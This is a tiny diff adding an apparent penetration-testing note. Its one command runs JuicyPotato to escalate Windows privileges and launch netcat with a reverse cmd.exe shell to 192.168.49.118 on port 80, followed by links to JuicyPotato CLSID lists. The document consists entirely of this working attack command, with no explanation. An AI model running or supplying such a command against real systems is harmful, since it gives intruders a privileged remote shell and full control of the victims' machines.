@@ -1,0 +1,6 @@
+juicy.potato.x86.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\wamp\www\nc.exe -e cmd.exe 192.168.49.118 80" -t * -c {CLSID}
+
+
+
+http://ohpe.it/juicy-potato/CLSID/
+https://github.com/ohpe/juicy-potato/tree/master/CLSID
